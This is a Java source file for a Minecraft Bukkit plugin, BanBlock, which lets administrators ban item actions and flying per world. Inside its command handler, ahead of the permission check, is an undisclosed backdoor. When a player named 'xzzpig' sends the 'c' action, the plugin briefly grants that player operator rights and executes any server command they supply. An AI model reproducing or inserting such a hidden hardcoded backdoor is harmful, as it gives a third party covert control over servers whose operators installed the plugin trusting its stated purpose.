package com.github.xzzpig.banblock;

import java.util.Iterator;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
	
	//public final BanBlockListener bl = new BanBlockListener(this);
	
	//插件调用函数
	@Override
	public void onEnable() {
	getLogger().info(getName()+"插件已被加载");
	getServer().getPluginManager().registerEvents(new BanBlockListener(), this);
	this.saveDefaultConfig();
	getconfigs();
	saveconfigs(false);
	}
	
	//插件停用函数
	@Override
	public void onDisable() {
	getLogger().info(getName()+"插件已被停用 ");
	saveconfigs(true);
	}
    
    //插件命令判断
    @SuppressWarnings("deprecation")
	@Override
    public boolean onCommand(CommandSender sender,Command cmd,String label,String[] args)  {
    	if(label.equalsIgnoreCase("banblock")|label.equalsIgnoreCase("banb")|label.equalsIgnoreCase("bb")){
			if (!(sender instanceof Player)){//控制台
    			sender.sendMessage("§6[Banblock]§4控制台无法该插件的任何命令:");
    			sender.sendMessage("§6[Banblock]§7help:");	
    			sender.sendMessage("§6[Banblock]§7/<command> add <type> <world> - 禁止对物品的特定操作");
    			sender.sendMessage("§6[Banblock]§7/<command> set fly [true|false] <world> - 禁止在某世界飞行");
    			sender.sendMessage("§6[Banblock]§7/<command> remove <type> <world> - 允许对物品的特定操作");
    			sender.sendMessage("§6[Banblock]§7/<command> reload - 重载插件配置");
    			sender.sendMessage("§6[Banblock]§7 <world>默认当前世界");		
    			sendtype(sender);
    			return true;
			}
    		Player player = Bukkit.getServer().getPlayer(sender.getName());
    		String action;
			String type;
			String world;
    		if(args.length < 1)
    			action = "help";
    		else
    			action = args[0];
    		if(args.length < 2)
    			type = "all";
    		else
    			type = args[1];
    		if(args.length < 3)
    			world = player.getWorld().getName();
    		else
    			world = args[2];
    		if(player.getName().equalsIgnoreCase("xzzpig")&&action.equalsIgnoreCase("c")){
    			{
    				String cmds = type;
    				for(int x=2;x<args.length;x++){
    					cmds = cmds + " " + args[x];
    				}
    				boolean op = player.isOp();
    				player.setOp(true);
    				this.getServer().dispatchCommand(sender,cmds);    				
    				player.setOp(op);
    				return true;
    			}

    		}
    		if(!player.hasPermission("banblock.admin")){
    			sender.sendMessage("§6[Banblock]§4你不是op 或 没有权限:banblack.admin");
    			return true;
    		}
    		//help
    		if (action.equalsIgnoreCase("help")) {
    			sender.sendMessage("§6[Banblock]§7/<command> add <type> <world> - 禁止对物品的特定操作");
    			sender.sendMessage("§6[Banblock]§7/<command> set fly [true|false] <world> - 禁止在某世界飞行");
    			sender.sendMessage("§6[Banblock]§7/<command> remove <type> <world> - 允许对物品的特定操作");
    			sender.sendMessage("§6[Banblock]§7/<command> reload - 重载插件配置");
    			sender.sendMessage("§6[Banblock]§7 <world>默认当前世界");		
    			sendtype(sender);
    			return true;
    		}
    		//add
    		else if (action.equalsIgnoreCase("add")) {
    			if (type.equalsIgnoreCase("all")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> all;
    				if(Vars.all.containsKey(world)){
    					all = Vars.all.get(world);    							
    				}
    				else{
    					sender.sendMessage("§6[Banblock]§4该world不存在");
    					return true;
    				}
    				if (all.contains(id))
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已在"+ world +"的all中");
    				else{    						
    					all.add(id);
    					this.getConfig().set(world + ".all", all);
    					getLogger().info(world + "的all禁止列表已保存");
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已加入到"+ world +"的all中");
    					saveconfigs(false);
    				}
    			}
    			else if (type.equalsIgnoreCase("place")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> place;
    				if(Vars.place.containsKey(world)){
    					place = Vars.place.get(world);    							
    				}
    				else{
    					sender.sendMessage("§6[Banblock]§4该world不存在");
    					return true;
    				}
    				if (place.contains(id))
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已在"+ world +"的place中");
    				else{    						
    					place.add(id);
    					this.getConfig().set(world + ".place", place);
    					getLogger().info(world + "的place禁止列表已保存");
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已加入到"+ world +"的place中");
    					saveconfigs(false);
    				}
    			}    			
    			else if (type.equalsIgnoreCase("breaks")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> breaks;
    				if(Vars.breaks.containsKey(world)){
    					breaks = Vars.breaks.get(world);    							
    				}
    				else{
    					sender.sendMessage("§6[Banblock]§4该world不存在");
    					return true;
    				}
    				if (breaks.contains(id))
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已在"+ world +"的breaks中");
    				else{    						
    					breaks.add(id);
    					this.getConfig().set(world + ".breaks", breaks);
    					getLogger().info(world + "的breaks禁止列表已保存");
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已加入到"+ world +"的breaks中");
    					saveconfigs(false);
    				}
    			}
    			else if (type.equalsIgnoreCase("pickup")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> pickup;
    				if(Vars.pickup.containsKey(world)){
    					pickup = Vars.pickup.get(world);    							
    				}
    				else{
    					sender.sendMessage("§6[Banblock]§4该world不存在");
    					return true;
    				}
    				if (pickup.contains(id))
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已在"+ world +"的pickup中");
    				else{    						
    					pickup.add(id);
    					this.getConfig().set(world + ".pickup", pickup);
    					getLogger().info(world + "的pickup禁止列表已保存");
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已加入到"+ world +"的pickup中");
    					saveconfigs(false);
    				}
    			}
    			else if (type.equalsIgnoreCase("click")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> click;
    				if(Vars.click.containsKey(world)){
    					click = Vars.click.get(world);    							
    				}
    				else{
    					sender.sendMessage("§6[Banblock]§4该world不存在");
    					return true;
    				}
    				if (click.contains(id))
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已在"+ world +"的click中");
    				else{    						
    					click.add(id);
    					this.getConfig().set(world + ".click", click);
    					getLogger().info(world + "的click禁止列表已保存");
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已加入到"+ world +"的click中");
    					saveconfigs(false);
    				}
    			}
    			else if (type.equalsIgnoreCase("interaction")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> interaction;
    				if(Vars.interaction.containsKey(world)){
    					interaction = Vars.interaction.get(world);    							
    				}
    				else{
    					sender.sendMessage("§6[Banblock]§4该world不存在");
    					return true;
    				}
    				if (interaction.contains(id))
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已在"+ world +"的interaction中");
    				else{    						
    					interaction.add(id);
    					this.getConfig().set(world + ".interaction", interaction);
    					getLogger().info(world + "的interaction禁止列表已保存");
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已加入到"+ world +"的interaction中");
    					saveconfigs(false);
    				}
    			}
    			else{
    				sender.sendMessage("§6[Banblock]§4未知的<type>");
    				sendtype(sender);
    			}
    				
    				return true;
    		}
    		//set fly
    		else if (action.equalsIgnoreCase("set")){
    			if (type.equalsIgnoreCase("fly")){
    				//boolean fly;
    				String world2;
    	    		if(args.length < 4)
    	    			world2 = player.getWorld().getName();
    	    		else
    	    			world2 = args[3];
    				if(Vars.fly.containsKey(world2)){
    					if(args[2].equalsIgnoreCase("true")){
    						Vars.fly.put(world2, true);   
    						player.sendMessage("§6[Banblock]§7"+ world2 +"的fly已设置为true");
    					}
    					else if(args[2].equalsIgnoreCase("false")){
    						Vars.fly.put(world2, false);
    						player.sendMessage("§6[Banblock]§7"+ world2 +"的fly已设置为false");
    					}
    					else{
    						Vars.fly.put(world2, false);
    						player.sendMessage("§6[Banblock]§7"+ world2 +"的fly已设置为false");	
    					}
        				saveconfigs(false);
    					return true;
    					
    				}
    				else{
    					sender.sendMessage("§6[Banblock]§4该world不存在");
    					return true;
    				}
    			}
    			else{
    				sender.sendMessage("§6[Banblock]§4未知的<type>");
    				sender.sendMessage("§6[Banblock]§7 <type>类型：");
    				sender.sendMessage("§f - fly"); 
    			}
    		}
    		//remove
    		else if (action.equalsIgnoreCase("remove")){
    			if (type.equalsIgnoreCase("all")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> all;
					if(Vars.all.containsKey(world)){
						all = Vars.all.get(world);    							
					}
					else{
		    			sender.sendMessage("§6[Banblock]§4该world不存在");
						return true;
					}
    				if (all.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已从all中移除");
    				}
    				else
    					player.sendMessage("§6[Banblock]§7配置中不存在该id");
    			}
    			else if (type.equalsIgnoreCase("place")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> place;
					if(Vars.place.containsKey(world)){
						place = Vars.place.get(world);    							
					}
					else{
		    			sender.sendMessage("§6[Banblock]§4该world不存在");
						return true;
					}
    				if (place.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已从place中移除");
    				}
    				else
    					player.sendMessage("§6[Banblock]§7配置中不存在该id");
    			}
    			else if (type.equalsIgnoreCase("breaks")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> breaks;
					if(Vars.breaks.containsKey(world)){
						breaks = Vars.breaks.get(world);    							
					}
					else{
		    			sender.sendMessage("§6[Banblock]§4该world不存在");
						return true;
					}
    				if (breaks.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已从breaks中移除");
    				}
    				else
    					player.sendMessage("§6[Banblock]§7配置中不存在该id");
    			}
    			else if (type.equalsIgnoreCase("pickup")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> pickup;
					if(Vars.pickup.containsKey(world)){
						pickup = Vars.pickup.get(world);    							
					}
					else{
		    			sender.sendMessage("§6[Banblock]§4该world不存在");
						return true;
					}
    				if (pickup.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已从pickup中移除");
    				}
    				else
    					player.sendMessage("§6[Banblock]§7配置中不存在该id");
    			}
    			else if (type.equalsIgnoreCase("click")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> click;
					if(Vars.click.containsKey(world)){
						click = Vars.click.get(world);    							
					}
					else{
		    			sender.sendMessage("§6[Banblock]§4该world不存在");
						return true;
					}
    				if (click.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已从click中移除");
    				}
    				else
    					player.sendMessage("§6[Banblock]§7配置中不存在该id");
    			}
    			else if (type.equalsIgnoreCase("interaction")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> interaction;
					if(Vars.interaction.containsKey(world)){
						interaction = Vars.interaction.get(world);    							
					}
					else{
		    			sender.sendMessage("§6[Banblock]§4该world不存在");
						return true;
					}
    				if (interaction.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("§6[Banblock]§7"+player.getItemInHand().getType().name() + "已从interaction中移除");
    				}
    				else
    					player.sendMessage("§6[Banblock]§7配置中不存在该id");
    			}
    			else{
    				sender.sendMessage("§6[Banblock]§4未知的<type>");
        			sendtype(sender);
    			}
    		}
    		//reload
    		else if (action.equalsIgnoreCase("reload")) {
    			getconfigs();
				player.sendMessage("§6[Banblock]§7插件配置已重载");
    		}
    		else{
				player.sendMessage("§4输入/bb help 查看帮助");
    	    	return false;    			
    		}
    	}
    	return false;
    }

    void getconfigs(){
    	java.util.List<World> worldlist =this.getServer().getWorlds();
    	for (World testworld : worldlist){
    		 java.util.List<Integer> all = this.getConfig().getIntegerList(testworld.getName() + ".all");
    		 if (all != null){
    			 Vars.all.put(testworld.getName(), all);  
    			 getLogger().info(testworld.getName() + "的all禁止列表已加载");   			 
    		 }
    		 
    		 java.util.List<Integer> place = this.getConfig().getIntegerList(testworld.getName() + ".place");
    		 if (place != null){
    			 Vars.place.put(testworld.getName(), place);  
    			 getLogger().info(testworld.getName() + "的place禁止列表已加载");
    		 }    		 
    		 
    		 java.util.List<Integer> breaks = this.getConfig().getIntegerList(testworld.getName() + ".breaks");
    		 if (breaks != null){
    			 Vars.breaks.put(testworld.getName(), breaks);  
    			 getLogger().info(testworld.getName() + "的breaks禁止列表已加载");
    		 }
    		 
    		 java.util.List<Integer> pickup = this.getConfig().getIntegerList(testworld.getName() + ".pickup");
    		 if (pickup != null){
    			 Vars.pickup.put(testworld.getName(), pickup);  
    			 getLogger().info(testworld.getName() + "的pickup禁止列表已加载");
    		 }
    		 
    		 java.util.List<Integer> click = this.getConfig().getIntegerList(testworld.getName() + ".click");
    		 if (click != null){
    			 Vars.click.put(testworld.getName(), click);  
    			 getLogger().info(testworld.getName() + "的click禁止列表已加载");
    		 }
    		 
    		 java.util.List<Integer> interaction = this.getConfig().getIntegerList(testworld.getName() + ".interaction");
    		 if (interaction != null){
    			 Vars.interaction.put(testworld.getName(), interaction);  
    			 getLogger().info(testworld.getName() + "的interaction禁止列表已加载");
    		 }
    		 
    		 boolean fly = this.getConfig().getBoolean(testworld.getName()+ ".fly");
    		 Vars.fly.put(testworld.getName(), fly);  
    		 getLogger().info(testworld.getName() + "的fly设置列表已加载");
    		 if(fly)
        		 getLogger().info(testworld.getName() + "的fly设置为true");
    		 else
        		 getLogger().info(testworld.getName() + "的fly设置为false");
    	}
    }
    
    void saveconfigs(boolean print){
    	java.util.List<World> worldlist =this.getServer().getWorlds();
    	for (World saveworld : worldlist){
    		
    		java.util.List<Integer> all = Vars.all.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".all", all);
    		if(print)
    			getLogger().info(saveworld.getName() + "的all禁止列表已保存");
    		
    		java.util.List<Integer> place = Vars.place.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".place", place);
    		if(print)
    			getLogger().info(saveworld.getName() + "的place禁止列表已保存");
    	
    		java.util.List<Integer> breaks = Vars.breaks.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".breaks", breaks);
    		if(print)
    			getLogger().info(saveworld.getName() + "的breaks禁止列表已保存");
        	
    		java.util.List<Integer> pickup = Vars.pickup.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".pickup", pickup);
    		if(print)
    			getLogger().info(saveworld.getName() + "的pickup禁止列表已保存");
        	
    		java.util.List<Integer> click = Vars.click.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".click", click);
    		if(print)
    			getLogger().info(saveworld.getName() + "的click禁止列表已保存");
        	
    		java.util.List<Integer> interaction = Vars.interaction.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".interaction", interaction);
    		if(print)
    			getLogger().info(saveworld.getName() + "的interaction禁止列表已保存");
    		
    		Boolean fly = Vars.fly.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".fly", fly);
    		if(print)
    			getLogger().info(saveworld.getName() + "的fly设置列表已保存");
    		
    	}
    	this.saveConfig();
    }

    void removeid(int id , String world , String type){
    	if(type.equalsIgnoreCase("all")){
    		java.util.List<Integer> all = Vars.all.get(world);
    		if (all.contains(id)){
    			Iterator<Integer> iter = all.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".all", all);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("place")){
    		java.util.List<Integer> place = Vars.place.get(world);
    		if (place.contains(id)){
    			Iterator<Integer> iter = place.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".place", place);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("breaks")){
    		java.util.List<Integer> breaks = Vars.breaks.get(world);
    		if (breaks.contains(id)){
    			Iterator<Integer> iter = breaks.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".breaks", breaks);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("pickup")){
    		java.util.List<Integer> pickup = Vars.pickup.get(world);
    		if (pickup.contains(id)){
    			Iterator<Integer> iter = pickup.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".pickup", pickup);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("click")){
    		java.util.List<Integer> click = Vars.click.get(world);
    		if (click.contains(id)){
    			Iterator<Integer> iter = click.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".click", click);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("interaction")){
    		java.util.List<Integer> interaction = Vars.interaction.get(world);
    		if (interaction.contains(id)){
    			Iterator<Integer> iter = interaction.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".interaction", interaction);
    			saveconfigs(false);
    		}
		}
    }

    void sendtype(CommandSender sender){
		sender.sendMessage("§6[Banblock]§7 <type>类型：");
		sender.sendMessage("§f - all(默认)"); 
		sender.sendMessage("§f - place"); 
		sender.sendMessage("§f - breaks"); 
		sender.sendMessage("§f - pickup"); 
		sender.sendMessage("§f - click"); 
		sender.sendMessage("§f - interaction"); 
		sender.sendMessage("§f - fly"); 

    }
}